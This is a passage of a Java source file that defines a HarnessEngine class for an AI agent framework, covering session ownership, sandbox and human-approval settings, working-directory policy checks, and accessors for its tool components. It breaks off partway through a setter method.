/*
 * Copyright 2017-2026 noear.org and authors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.noear.solon.ai.harness;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.atomic.AtomicBoolean;
import org.noear.solon.ai.harness.spi.SessionOwnership;
import org.noear.solon.ai.harness.spi.OwnerCheck;
import org.noear.solon.ai.harness.spi.NotOwnerException;
import org.noear.solon.ai.harness.scope.ScopeGuardInterceptor;
import org.noear.solon.ai.harness.scope.InputScope;
import org.noear.solon.ai.harness.scope.InputScopeResolver;
import org.noear.solon.Utils;
import org.noear.solon.ai.agent.AgentSession;
import org.noear.solon.ai.agent.AgentSessionProvider;
import org.noear.solon.ai.agent.react.ReActAgent;
import org.noear.solon.ai.agent.react.ReActRequest;
import org.noear.solon.ai.agent.react.intercept.HITLInterceptor;
import org.noear.solon.ai.agent.react.intercept.ContextCompressionInterceptor;
import org.noear.solon.ai.agent.react.intercept.CompressionStrategy;
import org.noear.solon.ai.agent.react.intercept.StopLoopInterceptor;
import org.noear.solon.ai.agent.react.intercept.compress.CompositeCompressionStrategy;
import org.noear.solon.ai.agent.react.intercept.compress.HierarchicalCompressionStrategy;
import org.noear.solon.ai.agent.react.intercept.compress.KeyInfoExtractionStrategy;
import org.noear.solon.ai.chat.CacheControl;
import org.noear.solon.ai.chat.ChatConfig;
import org.noear.solon.ai.chat.ChatModel;
import org.noear.solon.ai.chat.prompt.Prompt;
import org.noear.solon.ai.harness.agent.*;
import org.noear.solon.ai.harness.agent.task.GenerateTalent;
import org.noear.solon.ai.harness.agent.task.TaskTalent;
import org.noear.solon.ai.harness.command.Command;
import org.noear.solon.ai.harness.command.CommandRegistry;
import org.noear.solon.ai.harness.input.HarnessInput;
import org.noear.solon.ai.harness.input.InputOutcome;
import org.noear.solon.ai.harness.hitl.BashToolStrategy;
import org.noear.solon.ai.harness.hitl.SessionPermissions;
import org.noear.solon.ai.harness.permission.PermissionContext;
import org.noear.solon.ai.harness.spi.InputBacklog;
import org.noear.solon.ai.harness.session.HarnessAttrs;
import org.noear.solon.ai.harness.session.SessionSelections;
import org.noear.solon.ai.harness.session.SessionStatus;
import org.noear.solon.ai.harness.agent.AgentDefinition;

import org.noear.solon.ai.harness.permission.PermissionRule;
import org.noear.solon.ai.mcp.client.McpClientProvider;
import org.noear.solon.ai.mount.*;
import org.noear.solon.ai.mount.catalog.*;
import org.noear.solon.ai.mount.source.MountSource;
import java.util.concurrent.atomic.AtomicInteger;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.function.BiPredicate;
import org.noear.solon.ai.mount.source.ClasspathMountSource;
import org.noear.solon.ai.talents.memory.MemorySolutionProvider;
import org.noear.solon.ai.harness.agent.ToolName;
import org.noear.solon.ai.talents.cli.*;
import org.noear.solon.ai.talents.code.CodeTalent;
import org.noear.solon.ai.talents.todo.TodoTalent;
import org.noear.solon.ai.talents.lsp.LspManager;
import org.noear.solon.ai.talents.lsp.LspServerParameters;
import org.noear.solon.ai.talents.lsp.LspTalent;
import org.noear.solon.ai.mcp.client.McpServerParameters;
import org.noear.solon.ai.talents.memory.MemoryTalent;

import java.util.function.Predicate;
import java.util.stream.Collectors;
import org.noear.solon.ai.talents.gateway.openapi.ApiSource;
import org.noear.solon.ai.talents.gateway.openapi.ApiSourceClient;
import org.noear.solon.ai.talents.gateway.OpenApiGatewayTalent;
import org.noear.solon.ai.talents.gateway.McpGatewayTalent;
import org.noear.solon.ai.talents.web.CodeSearchTalent;
import org.noear.solon.ai.talents.web.WebfetchTalent;
import org.noear.solon.ai.talents.web.WebsearchTalent;
import org.noear.solon.core.util.Assert;
import org.noear.solon.lang.Nullable;
import org.noear.solon.lang.Preview;
import org.noear.solon.net.http.HttpUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.*;
import java.util.concurrent.locks.ReentrantLock;
import java.util.function.Consumer;

/**
 * Harness 引擎
 *
 * @author noear
 * @since 4.0
 */
@Preview("3.10")
public class HarnessEngine {
    private static final Logger LOG = LoggerFactory.getLogger(HarnessEngine.class);

    public final static String ATTR_CWD = HarnessAttrs.LEGACY_CWD;
    private static final String BUILTIN_AGENT_MOUNT = "@harness-agents";
    private static final String BUILTIN_AGENT_PATH = "META-INF/solon/ai/harness/agents/";

    /**
     * 会话属性：本轮实际生效的子代理名（含 {@code @子代理} 解析结果）。
     *
     * <p>由 {@code handle} 在返回 {@link InputOutcome.Kind#TASK TASK} 时自动写入，
     * 主代理归一为 {@code "main"}。HITL 续流（审批请求通常不带 selectedAgent）
     * 与事件侧「源代理判定」均以它为准：trace 按代理名分 key，取错代理会取不到挂起的
     * tool_calls，表现为续跑空转。无状态宿主（如 Web 的跨请求审批）不必再自建记忆。</p>
     *
     * @since 4.2.0
     */
    public final static String ATTR_AGENT_EFFECTIVE = HarnessAttrs.AGENT_EFFECTIVE;

    private final ReentrantLock agentLock = new ReentrantLock();

    private final HarnessOptions options;

    /** 引擎自建的默认技能目录（订阅挂载变更、持有技能禁用列表）。 */
    private final DefaultSkillCatalog skillCatalog;
    private final DefaultAgentCatalog agentCatalog;

    private final CodeTalent codeTalent;
    private final TodoTalent todoTalent;
    private final TaskTalent taskTalent;
    private final GenerateTalent generateTalent;

    private final ClockTalent clockTalent;

    private final WebfetchTalent webfetchTalent;
    private final WebsearchTalent websearchTalent;
    private final CodeSearchTalent codeSearchTalent;

    private final LspManager lspManager;
    private final LspTalent lspTalent;

    private final McpGatewayTalent mcpGatewayTalent;
    private final OpenApiGatewayTalent openApiGatewayTalent;

    private final MemoryTalent memoryTalent;

    private final TerminalTalent terminalTalent;
    private final SkillTalent skillTalent;

    /** 输入受理流水线（handle 的实现）。 */
    private final InputPipeline inputPipeline;
    /** 会话控制面（admit/status/isIdle/中断第一段的实现）。 */
    private final SessionControl sessionControl;

    private final AgentManager agentManager;

    private volatile ReActAgent mainAgent; //允许运行时切换

    public String getName() {
        return getMainAgent().name();
    }

    public CommandRegistry getCommandRegistry() {
        return options.commandRegistry;
    }

    public AgentManager getAgentManager() {
        return agentManager;
    }

    public ContextCompressionInterceptor getCompressionInterceptor() {
        return options.getCompressionInterceptor();
    }

    public StopLoopInterceptor getStopLoopInterceptor() {
        return options.getStopLoopInterceptor();
    }

    /**
     * 是否要求每轮都有作用域（见 {@link Builder#scopeRequired}）
     *
     * @since 4.2.0
     */
    public boolean isScopeRequired() {
        return options.isScopeRequired();
    }

    /**
     * 请求级作用域解析器（可为 null）
     *
     * @since 4.2.0
     */
    @Nullable
    public InputScopeResolver getScopeResolver() {
        return options.getScopeResolver();
    }

    /**
     * 会话归属（多节点单写者租约；单机为 {@link SessionOwnership#LOCAL}）
     *
     * @since 4.2.0
     */
    public SessionOwnership getSessionOwnership() {
        return options.getSessionOwnership();
    }

    /**
     * 会话归属检查（多节点单写者）：本节点持有、或首次认领成功时 {@code isOwned()} 为 true。
     *
     * <p>{@code handle} 第 0 步已内置本检查；其它<b>写</b>门面（queue / steer / goal / loop / interrupt）也先调它，
     * 非持有节点不得在本地内存里改会话状态并写快照（否则两个节点同时写同一个会话）。
     * 在没有任何节点持有的会话上调用，本节点成为持有者。单机（{@link SessionOwnership#LOCAL}）恒为持有。</p>
     *
     * <p>可以在取会话之前调用（只看 sessionId）：非持有节点不应把会话从共享存储加载进自己的内存。</p>
     *
     * @since 4.2.0
     */
    public OwnerCheck checkOwner(@Nullable String sessionId) {
        return sessionControl.checkOwner(sessionId);
    }

    /** @see #checkOwner(String) */
    public OwnerCheck checkOwner(@Nullable AgentSession session) {
        return sessionControl.checkOwner(session == null ? null : session.getSessionId());
    }

    /**
     * 要求本节点持有会话，否则抛 {@link NotOwnerException}（宿主按 {@code getOwner()} 转发）
     *
     * @since 4.2.0
     */
    public void requireOwner(@Nullable String sessionId) {
        OwnerCheck check = checkOwner(sessionId);
        if (check.isOwned() == false) {
            throw new NotOwnerException(sessionId, check.getOwner());
        }
    }

    /**
     * 取已存在的会话，不存在时抛 {@link IllegalArgumentException}（不新建）。
     *
     * <p>管理接口拿到的是外部传入的会话 ID：用 {@link #getSession(String)} 会把不存在（或已删除）的会话建出来。</p>
     *
     * @since 4.2.0
     */
    public AgentSession requireSession(String sessionId) {
        AgentSession session = getSessionOrNull(sessionId);
        if (session == null) {
            throw new IllegalArgumentException("Session not found: " + sessionId);
        }
        return session;
    }

    /**
     * 引擎是否已关闭（{@link #shutdown()} 之后）。关闭后 {@code handle} 返回
     * {@code REJECTED} + {@code InputOutcome.REJECT_ENGINE_CLOSED}。
     *
     * @since 4.2.0
     */
    public boolean isClosed() {
        return closed.get();
    }

    public CacheControl getCacheControl() {
        return options.getCacheControl();
    }

    // ========== 权限系统 ==========

    /**
     * 获取当前权限上下文
     */
    public PermissionContext getPermissionContext() {
        return options.getPermissionContext();
    }

    /**
     * 添加权限规则
     */
    public void addPermissionRule(PermissionRule rule) {
        assertMutable("addPermissionRule");
        if (rule != null) {
            options.updatePermissionContext(ctx -> ctx.addRule(rule));
        }
    }

    /**
     * 批量添加权限规则
     */
    public void addPermissionRules(List<PermissionRule> rules) {
        assertMutable("addPermissionRules");
        if (Utils.isNotEmpty(rules)) {
            options.updatePermissionContext(ctx -> ctx.addRules(rules));
        }
    }


    public HITLInterceptor getHitlInterceptor() {
        return options.getHitlInterceptor();
    }

    public TerminalTalent getTerminalTalent() {
        return terminalTalent;
    }

    public SkillTalent getSkillTalent() {
        return skillTalent;
    }

    /**
     * harness 状态数据来源（会话级状态，如 TODO 清单；不对模型的文件工具开放）。
     *
     * @since 4.2.0
     */
    public MountSource getStateSource() {
        return options.getStateSource();
    }

    /**
     * 工作区来源（harness 写入工作区的产物经它落地，如子任务超长结果、生成的子代理定义）。
     *
     * <p>当前引擎总是按 workspace 创建本地来源；模型文件工具与 bash 也都直接操作 workspace 本地文件。
     * 远程工作区需要先有同步机制，见 {@code MountManager(String, MountSource)} 的说明。</p>
     *
     * @since 4.2.0
     */
    public MountSource getWorkspaceSource() {
        return options.mountManager.getWorkspaceSource();
    }

    public TodoTalent getTodoTalent() {
        return todoTalent;
    }

    public TaskTalent getTaskTalent() {
        return taskTalent;
    }

    /** 经本引擎装配、正在执行的请求数（stream 订阅期间 / call 执行期间） */
    private final AtomicInteger activeRuns = new AtomicInteger();

    /**
     * 是否静默（可安全回收）：没有正在执行的请求，且所有扩展都没有需要本引擎继续存活的后台工作
     * （见 {@link HarnessExtension#isQuiescent}，如活跃的 goal、定时任务）。供引擎池按空闲回收。
     *
     * @since 4.2.0
     */
    public boolean isQuiescent() {
        if (activeRuns.get() > 0) {
            return false;
        }

        for (HarnessExtension extension : options.getExtensions()) {
            try {
                if (extension.isQuiescent(this) == false) {
                    return false;
                }
            } catch (Throwable e) {
                // 判定异常按「不静默」处理：宁可晚回收，不可误回收
                LOG.warn("HarnessExtension isQuiescent failed: {}", extension.getClass().getName(), e);
                return false;
            }
        }
        return true;
    }

    /**
     * 正在执行的请求数
     *
     * @since 4.2.0
     */
    public int getActiveRunCount() {
        return activeRuns.get();
    }

    /**
     * 释放引擎持有的资源
     *
     * <p>三件事：① 通知全部扩展 {@link HarnessExtension#onDetach}（让扩展回收自己在
     * onAttach 里建到<b>引擎之外</b>的资源，如 JVM 单例调度器上的 job、独立线程池、长连接——
     * 引擎本身不知道这些资源的存在）；② 关闭子代理委派的私有执行器；③ 释放本引擎认领过的会话租约
     * （多节点时让其它节点可以接管）。</p>
     *
     * <p>顺序：先扩展后执行器——扩展的清理动作（如停调度）不应与执行器回收并发。</p>
     *
     * <p>执行器线程为守护线程，不调用也不会阻塞 JVM 退出；
     * 需要回收线程时（如测试、长驻进程中的引擎热替换）显式调用。</p>
     *
     * <p>本方法幂等：重复调用只是重复回调 onDetach（各实现应保持幂等）与重复 shutdown 执行器。</p>
     */
    public void shutdown() {
        if (closed.compareAndSet(false, true) == false) {
            return; // 幂等
        }

        // 不判 isEnabled()：清理不得被开关阻止（与 removeExtension 同口径）
        for (HarnessExtension extension : options.getExtensions()) {
            try {
                extension.onDetach(this);
            } catch (Throwable e) {
                // 清理期异常不得打断其余扩展与执行器回收
                LOG.warn("HarnessExtension onDetach failed on shutdown: {}", extension.getClass().getName(), e);
            }
        }

        quietly("taskExecutor", taskTalent::shutdown);
        // LSP 子进程与 MCP 连接归引擎所有：引擎池回收时不关会泄漏进程与连接
        quietly("lsp", lspManager::shutdownAll);
        quietly("mcp", () -> {
            for (String name : new ArrayList<>(mcpGatewayTalent.getMcpServerNames())) {
                quietly("mcp:" + name, () -> mcpGatewayTalent.removeMcpServer(name));
            }
        });
        sessionControl.releaseAllOwnership();
    }

    private static void quietly(String what, Runnable action) {
        try {
            action.run();
        } catch (Throwable e) {
            LOG.warn("[Harness] shutdown step failed: {}", what, e);
        }
    }

    private final AtomicBoolean closed = new AtomicBoolean();

    public CodeTalent getCodeTalent() {
        return codeTalent;
    }

    public MemoryTalent getMemoryTalent() {
        return memoryTalent;
    }

    public GenerateTalent getGenerateTalent() {
        return generateTalent;
    }

    public CodeSearchTalent getCodeSearchTalent() {
        return codeSearchTalent;
    }

    public ClockTalent getClockTalent() {
        return clockTalent;
    }

    public WebsearchTalent getWebsearchTalent() {
        return websearchTalent;
    }

    public WebfetchTalent getWebfetchTalent() {
        return webfetchTalent;
    }

    public McpGatewayTalent getMcpGatewayTalent() {
        return mcpGatewayTalent;
    }

    public OpenApiGatewayTalent getOpenApiGatewayTalent() {
        return openApiGatewayTalent;
    }

    public LspTalent getLspTalent() {
        return lspTalent;
    }

    public AgentSessionProvider getSessionProvider() {
        return options.getSessionProvider();
    }

    public MemorySolutionProvider getMemoryProvider() {
        return options.getMemoryProvider();
    }

    public SkillCatalog getSkillCatalog() {
        return skillTalent.getSkillCatalog();
    }

    public AgentCatalog getAgentCatalog() {
        return agentCatalog;
    }

    // ========== 配置读取（代理到 options） ==========

    public String getHarnessHome() {
        return options.getHarnessHome();
    }

    public String getHarnessSessions() {
        return options.getHarnessSessions();
    }

    public String getHarnessSkills() {
        return options.getHarnessSkills();
    }

    public String getHarnessAgents() {
        return options.getHarnessAgents();
    }

    public String getHarnessCommands() {
        return options.getHarnessCommands();
    }

    public String getHarnessMemory() {
        return options.getHarnessMemory();
    }

    public String getHarnessChannels() {
        return options.getHarnessChannels();
    }

    /**
     * 当前目录
     */
    public String getUserDir() {
        return System.getProperty("user.dir");
    }

    /**
     * 用户主目录
     */
    public String getUserHome() {
        return System.getProperty("user.home");
    }

    public String getUserAgent() {
        return options.getUserAgent();
    }

    public String getWorkspace() {
        return options.getWorkspace();
    }

    /**
     * 会话工作目录（宿主与工具共用的唯一口径）。
     *
     * <p>未显式设置时回退到 {@link #getWorkspace()}。先前宿主各自写
     * {@code attrs().getOrDefault(ATTR_CWD, ".")}：既把引擎内部键当私有状态用，
     * 又硬编码了与工作区默认值不一致的 {@code "."}。宿主一律改用本方法。</p>
     *
     * @since 4.2.0
     */
    public String getSessionCwd(AgentSession session) {
        if (session == null) return getWorkspace();
        Object value = session.attrs().get(ATTR_CWD);
        if (value == null) {
            // 重启后内存键为空：从随快照持久的副本回填（只回填仍符合策略的）
            Object persisted = session.getContext().get(HarnessAttrs.SESSION_CWD);
            if (persisted instanceof String && ((String) persisted).isEmpty() == false && isCwdAllowed((String) persisted)) {
                session.attrs().putIfAbsent(ATTR_CWD, persisted);
                value = session.attrs().get(ATTR_CWD);
            }
        }
        return value == null ? getWorkspace() : String.valueOf(value);
    }

    /**
     * 设置会话工作目录（null/空 表示清除，回退到工作区默认值）。
     *
     * @since 4.2.0
     */
    public void setSessionCwd(AgentSession session, String cwd) {
        if (session == null) return;
        if (cwd == null || cwd.trim().isEmpty()) {
            session.attrs().remove(ATTR_CWD);
            session.getContext().remove(HarnessAttrs.SESSION_CWD);
        } else {
            checkCwdPolicy(cwd);
            session.attrs().put(ATTR_CWD, cwd);
            session.getContext().put(HarnessAttrs.SESSION_CWD, cwd);
        }
    }

    /** 会话工作目录仅在未设置时补写（首次进入时定位，不覆盖用户后续选择）。@since 4.2.0 */
    public void setSessionCwdIfAbsent(AgentSession session, String cwd) {
        if (session == null || cwd == null || cwd.trim().isEmpty()) return;
        checkCwdPolicy(cwd);
        if (session.attrs().putIfAbsent(ATTR_CWD, cwd) == null) {
            session.getContext().put(HarnessAttrs.SESSION_CWD, cwd);
        }
    }

    // ========== 会话主体（租户 / 用户） ==========

    /**
     * 会话主体（未设置为 null）。随快照持久化，是作用域解析器识别「这个会话属于谁」的唯一口径
     * （见 {@code InputScopeResolver#byPrincipal}），不必再把租户编码进 sessionId。
     *
     * @since 4.2.0
     */
    @Nullable
    public String getSessionPrincipal(@Nullable AgentSession session) {
        return SessionSelections.principalOf(session);
    }

    /**
     * 设置会话主体（创建会话时由宿主根据登录身份写入）。<b>设置后不可改</b>：再次设置相同值是空操作，
     * 设置不同值抛 {@link SecurityException}（防止把 A 的会话交给 B 继续用）。确需迁移用 {@link #rebindSessionPrincipal}。
     *
     * @since 4.2.0
     */
    public void setSessionPrincipal(AgentSession session, String principal) {
        Objects.requireNonNull(session, "session");
        if (Assert.isEmpty(principal)) {
            throw new IllegalArgumentException("principal is empty");
        }
        synchronized (session.attrs()) {
            String current = SessionSelections.principalOf(session);
            if (current == null) {
                SessionSelections.setPrincipal(session, principal);
            } else if (current.equals(principal) == false) {
                throw new SecurityException("Session principal is immutable: " + session.getSessionId());
            }
        }
    }

    /**
     * 管理操作：把会话改绑到另一个主体（如账号合并）。不受 {@code runtimeMutable} 约束，调用方自行鉴权。
     *
     * @since 4.2.0
     */
    public void rebindSessionPrincipal(AgentSession session, @Nullable String principal) {
        Objects.requireNonNull(session, "session");
        synchronized (session.attrs()) {
            SessionSelections.setPrincipal(session, principal);
        }
    }

    /** 会话目录是否符合 cwdPolicy（未配置时恒为 true） */
    private boolean isCwdAllowed(String cwd) {
        try {
            checkCwdPolicy(cwd);
            return true;
        } catch (SecurityException e) {
            LOG.warn("[Harness] persisted session cwd is out of policy, ignored: {}", cwd);
            return false;
        }
    }

    /**
     * 运行期全局配置锁：{@code runtimeMutable=false}（SERVER 缺省）时拒绝修改引擎级全局配置。
     * 这些修改会影响共用本引擎的所有会话/用户，差异应在构建期决定，或按请求收窄。
     */
    private void assertMutable(String op) {
        if (!options.isRuntimeMutable()) {
            throw new IllegalStateException(op + " is locked at runtime (runtimeMutable=false): "
                    + "decide engine-wide settings at build time" + buildTimeHint(op));
        }
    }

    /** 锁定报错里给出构建期的对应写法（最常见的误用是 build 之后再挂扩展）。 */
    private static String buildTimeHint(String op) {
        if ("addExtension".equals(op) || "removeExtension".equals(op)) {
            return "; attach extensions before build() with HarnessEngine.Builder.extensionAdd(...)";
        }
        return "";
    }

    /**
     * 会话工作目录边界校验：会话 cwd 会被加进文件工具根与 OS 沙盒写白名单，
     * 多租户下必须保证它不越出租户根目录（见 {@link Builder#cwdPolicy}）。
     */
    private void checkCwdPolicy(String cwd) {
        Predicate<String> policy = options.getCwdPolicy();
        if (policy == null) {
            return;
        }
        // 先规范化（防 ../）；目录存在时以真实路径为准（防符号链接逃逸，也兼容 /var → /private/var 这类系统链接）
        String effective;
        try {
            Path p = Paths.get(cwd).toAbsolutePath().normalize();
            effective = Files.exists(p) ? p.toRealPath().toString() : p.toString();
        } catch (Exception e) {
            throw new SecurityException("Session cwd is invalid: " + cwd);
        }
        if (!policy.test(effective)) {
            throw new SecurityException("Session cwd is out of policy: " + cwd);
        }
    }

    /**
     * 引擎运行模式（插件据此选择各自的保守缺省）
     *
     * @since 4.2.0
     */
    public HarnessProfile getProfile() {
        return options.getProfile();
    }

    // ========== 会话级选择项（模型 / 子代理）门面 ==========
    //
    // 与 getSessionCwd/setSessionCwd 对称：会话级选择是引擎与宿主共用的口径，
    // 宿主一律走本组方法（存储键已收为 SessionSelections 的私有实现）。
    // 此前同一键出现四种写法（put 值 / put 空串 / remove / 带 isNotEmpty 守卫），
    // 语义漂移正是这类「裸常量当私有状态用」的必然结果。

    /**
     * 会话级模型选择（未设置返回 {@code null}，调用方回退默认模型）。
     *
     * <p>口径：命令声明 → 会话选择 → 默认模型。本方法只读第二层。</p>
     *
     * @since 4.2.0
     */
    @Nullable
    public String getSessionModel(@Nullable AgentSession session) {
        return SessionSelections.modelOf(session);
    }

    /**
     * 设置会话级模型选择；{@code null}/空 表示清除（回退默认模型）。
     *
     * @since 4.2.0
     */
    public void setSessionModel(@Nullable AgentSession session, @Nullable String name) {
        SessionSelections.setModel(session, name);
    }

    /**
     * 会话级子代理选择（未设置返回 {@code null}，表示主代理）。
     *
     * @since 4.2.0
     */
    @Nullable
    public String getSessionAgent(@Nullable AgentSession session) {
        return SessionSelections.agentOf(session);
    }

    /**
     * 设置会话级子代理选择；{@code null}/空 表示清除（回退主代理）。
     *
     * <p><b>空值语义归一</b>：历史宿主对「清除」有三种写法（{@code put("")}、
     * {@code remove(...)}、{@code put(null)}）。本方法把三者统一为「清除」，
     * 读取侧 {@link #getSessionAgent} 也把空串视为未设置，故行为等价。</p>
     *
     * @since 4.2.0
     */
    public void setSessionAgent(@Nullable AgentSession session, @Nullable String name) {
        SessionSelections.setAgent(session, name);
    }

    public String getSystemPrompt() {
        return options.getSystemPrompt();
    }

    public int getMaxTurns() {
        return options.getMaxTurns();
    }

    public boolean isAutoRethink() {
        return options.isAutoRethink();
    }

    public int getSessionWindowSize() {
        return options.getSessionWindowSize();
    }

    public int getCompressionMaxMessages() {
        return options.getCompressionMaxMessages();
    }

    public double getCompressionMaxContextRatio() {
        return options.getCompressionMaxContextRatio();
    }

    public long getCompressionDefaultContextLength() {
        return options.getCompressionDefaultContextLength();
    }

    public boolean isMemoryEnabled() {
        return options.isMemoryEnabled();
    }

    public boolean isSandboxEnabled() {
        return options.isSandboxEnabled();
    }

    public boolean isHitlEnabled() {
        return options.isHitlEnabled();
    }

    public boolean isSubagentEnabled() {
        return options.isSubagentEnabled();
    }

    public boolean isBashAsyncEnabled() {
        return options.isBashAsyncEnabled();
    }

    /**
     * 命令前缀（默认 "/"）
     */
    public String getCommandPrefix() {
        return options.getCommandPrefix();
    }

    /**
     * 子代理提及前缀（默认 "@"）
     */
    public String getAgentPrefix() {
        return options.getAgentPrefix();
    }

    public int getApiRetries() {
        return options.getApiRetries();
    }

    public int getMcpRetries() {
        return options.getMcpRetries();
    }

    public int getModelRetries() {
        return options.getModelRetries();
    }

    public Collection<String> getTools() {
        return Collections.unmodifiableCollection(options.getTools());
    }

    public Collection<String> getDisallowedTools() {
        return Collections.unmodifiableCollection(options.getDisallowedTools());
    }

    public Collection<HarnessExtension> getExtensions() {
        return Collections.unmodifiableCollection(options.getExtensions());
    }

    /**
     * 按类型取已挂载的扩展或扩展提供的能力（宿主与插件取用扩展门面的唯一方式）
     *
     * <p>在 {@link #getExtensions()} 之上补一个类型化取用入口：扩展在 {@code addExtension} 之后
     * 原本只能通过遍历 + {@code instanceof} 找回，宿主每写一个扩展就要写一遍这段样板，
     * 且取不到时无统一口径可依。</p>
     *
     * <p><b>也用于能力查找</b>：{@code type} 可以是核心定义的能力接口（如
     * {@link InputBacklog}），返回首个实现了它的扩展。插件之间应按能力接口查找，
     * 而不是按对方的实现类查找（否则两个插件模块就耦合在一起了）。</p>
     *
     * <pre>{@code
     * engine.getExtension(QueueExtension.class)
     *       .ifPresent(queue -> queue.enqueue(session, "接着改文档"));
     *
     * InputBacklog backlog = engine.getExtension(InputBacklog.class).orElse(null);
     * }</pre>
     *
     * <p>多个同类实例时返回<b>首个</b>（与 {@code removeExtension} 只移除首个同口径）；
     * 未挂载或类型不匹配时返回 {@link Optional#empty()}（不抛异常——「没有这个能力」是正常状态，
     * 宿主据此决定是否降级，不该被迫用异常做分支）。</p>
     *
     * @param type 扩展类型或能力接口
     * @return 已挂载的扩展实例；未挂载时为 {@link Optional#empty()}
     * @since 4.2.0
     */
    public <T> Optional<T> getExtension(Class<T> type) {
        if (type == null) {
            return Optional.empty();
        }

        for (HarnessExtension extension : options.getExtensions()) {
            if (type.isInstance(extension)) {
                return Optional.of(type.cast(extension));
            }
        }

        return Optional.empty();
    }

    public Collection<Mount> getMounts() {
        return options.mountManager.getMounts();
    }

    public Mount getMount(String alias) {
        return options.mountManager.getMount(alias);
    }

    public SkillDescriptor getSkill(String name) {
        return skillTalent.getSkillCatalog().getDescriptor(name);
    }

    public Collection<SkillDescriptor> getSkills() {
        return skillTalent.getSkillCatalog().getDescriptors();
    }

    public Collection<SkillDescriptor> getSkillsByMount(String alias) {
        String mountAlias = alias.startsWith("@") ? alias : "@" + alias;
        return getSkills().stream().filter(s -> s.getId().equals(mountAlias)
                        || s.getId().startsWith(mountAlias + "/"))
                .collect(Collectors.toList());
    }

    /**
     * 获取被禁用的技能集合（按 aliasPath）
     */
    public Collection<String> getDisallowedSkills() {
        return skillCatalog.getDisallowSkills();
    }

    /**
     * 判断技能是否被禁用（按 aliasPath）
     */
    public boolean isSkillDisallowed(String aliasPath) {
        return skillCatalog.isSkillDisallowed(aliasPath);
    }

    /**
     * 动态禁用一个技能（按 aliasPath）
     */
    public void disallowSkill(String aliasPath) {
        assertMutable("disallowSkill");
        skillCatalog.disallowSkill(aliasPath);
    }

    /**
     * 动态允许一个技能（按 aliasPath）
     */
    public void allowSkill(String aliasPath) {
        assertMutable("allowSkill");
        skillCatalog.allowSkill(aliasPath);
    }

    /**
     * 批量重置被禁用的技能集合（按 aliasPath）
     */
    public void disallowSkillReset(Collection<String> disallowedSkills) {
        assertMutable("disallowSkillReset");
        skillCatalog.setDisallowSkills(disallowedSkills);
    }

    public Collection<AgentDescriptor> getAgents() {
        return agentCatalog.getAgents();
    }

    public Collection<AgentDescriptor> getAgentsByMount(String alias) {
        return agentCatalog.getAgentsByMount(alias);
    }

    public Map<String, McpServerParameters> getMcpServers() {
        return Collections.unmodifiableMap(options.getMcpServers());
    }

    public Map<String, ApiSource> getApiServers() {
        return Collections.unmodifiableMap(options.getApiServers());
    }

    public Map<String, LspServerParameters> getLspServers() {
        return Collections.unmodifiableMap(options.getLspServers());
    }

    public Collection<ChatConfig> getModels() {
        return Collections.unmodifiableCollection(options.getModels().values());
    }

    public ChatConfig getModelOrNil(String name) {
        return options.getModelOrNil(name);
    }

    public ChatModel getModelOrNilInstance(String name) {
        ChatConfig tmp = options.getModelOrNil(name);

        if (tmp == null) {
            return null;
        } else {
            return tmp.toChatModel();
        }
    }

    public ChatConfig getModelOrDef(String name) {
        return options.getModelOrDef(name);
    }

    public ChatModel getModelOrDefInstance(String name) {
        ChatConfig tmp = options.getModelOrDef(name);

        if (tmp == null) {
            return null;
        } else {
            return tmp.toChatModel();
        }
    }

    public String getDefaultModel() {
        return options.getDefaultModel();
    }

    // ========== 运行时动态修改 ==========

    public void setMaxTurns(Integer maxTurns) {
        if (maxTurns != null) {
            options.setMaxTurns(maxTurns);
        }
    }

    public void setModelRetries(Integer modelRetries) {
        if (modelRetries != null) {
            options.setModelRetries(modelRetries);
        }
    }

    public void setMcpRetries(Integer mcpRetries) {
        if (mcpRetries != null) {
            options.setMcpRetries(mcpRetries);
            mcpGatewayTalent.retryConfig(mcpRetries);
        }
    }

    public void setApiRetries(Integer apiRetries) {
        if (apiRetries != null) {
            options.setApiRetries(apiRetries);
            openApiGatewayTalent.retryConfig(apiRetries);
        }
    }

    /**
     * 开启/关闭记忆能力
     * <p>
     * 未注入 {@code memoryProvider} 时没有 memory talent 可开关（构建期显式置 null），
     * 仅写入配置值，不抛异常 —— 与相邻的 setMemoryRelevanceCount 等保持一致的空值守卫。
     */
    public void setMemoryEnabled(Boolean memoryEnabled) {
        assertMutable("setMemoryEnabled");
        options.setMemoryEnabled(memoryEnabled);
        if (memoryTalent != null) {
            memoryTalent.setEnabled(memoryEnabled);
        }
    }

    public void setMemoryRelevanceCount(int n) {
        options.setMemoryRelevanceCount(n);
        if (memoryTalent != null) {
            memoryTalent.relevanceCount(n);
        }
    }

    public void setMemoryPriorityCount(int n) {
        options.setMemoryPriorityCount(n);
        if (memoryTalent != null) {
            memoryTalent.priorityCount(n);
        }
    }

    public void setMemorySummaryLength(int n) {
        options.setMemorySummaryLength(n);
        if (memoryTalent != null) {
            memoryTalent.summaryLength(n);
        }
    }

    public void setSandboxEnabled(Boolean sandboxEnabled) {
        assertMutable("setSandboxEnabled");
        options.setSandboxEnabled(sandboxEnabled);
        terminalTalent.setSandboxEnabled(sandboxEnabled);
    }

    public void setSandboxAllowUserHome(Boolean sandboxAllowUserHome) {
        assertMutable("setSandboxAllowUserHome");
        options.setSandboxAllowUserHome(sandboxAllowUserHome);
        terminalTalent.setSandboxAllowUserHome(sandboxAllowUserHome);
    }

    public boolean isSandboxSystemRestrict() {
        return options.isSandboxSystemRestrict();
    }

    public void setSandboxSystemRestrict(Boolean sandboxSystemRestrict) {
        assertMutable("setSandboxSystemRestrict");
        options.setSandboxSystemRestrict(sandboxSystemRestrict);
        terminalTalent.setSandboxSystemRestrict(sandboxSystemRestrict);
    }

    public void setHitlEnabled(Boolean hitlEnabled) {
        assertMutable("setHitlEnabled");
        options.setHitlEnabled(hitlEnabled);

        if (options.getHitlInterceptor() != null) {
            options.getHitlInterceptor().setEnabled(hitlEnabled);
        }
    }

    public void setSubagentEnabled(Boolean subagentEnabled) {
        assertMutable("setSubagentEnabled");
